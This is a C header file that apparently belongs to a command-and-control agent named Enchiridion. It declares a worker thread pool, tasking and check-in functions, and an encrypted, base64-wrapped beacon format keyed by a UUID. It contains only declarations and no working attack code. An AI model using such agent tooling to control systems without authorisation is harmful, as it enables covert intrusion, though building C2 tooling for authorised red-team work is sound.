#ifndef ENCHIRIDION_H
#define ENCHIRIDION_H
#include "agent.h"
#include "b64.h"
#include "commands.h"
#include <pthread.h>

typedef struct Task {
    void *arg;
    struct Task *next;
} Task;

typedef struct {
    pthread_t *workers;
    int num_threads;

    Task *head;
    Task *tail;

    pthread_mutex_t lock;
    pthread_cond_t cond;
    int stop;
} ThreadPool;

typedef struct {
    char *decoded_task;
    int size;
    Agent *agent;
    ThreadPool *pool;
} TaskBundle;

// Threadpool functions
ThreadPool *threadPoolInit(int num_threads);
int threadPoolSubmit(ThreadPool *pool, void *arg);
void threadPoolDestroy(ThreadPool *pool);
void *worker(void *arg);

// Tasking functions
void handleTask(TaskBundle *bundle);
void taskingLoop(Agent *agent, ThreadPool *pool);
int checkIn(Agent *agent);
int sendResponse(Agent *agent, TaskResponse *task_response);

// Build the outbound wire payload: base64(UUID[36] + body).
// In encrypted modes the body is IV+AES(json)+HMAC; in NONE it is plain JSON.
char *buildOutbound(Agent *agent, const char *json_str, size_t *out_len);

#endif // !ENCHIRIDION_H
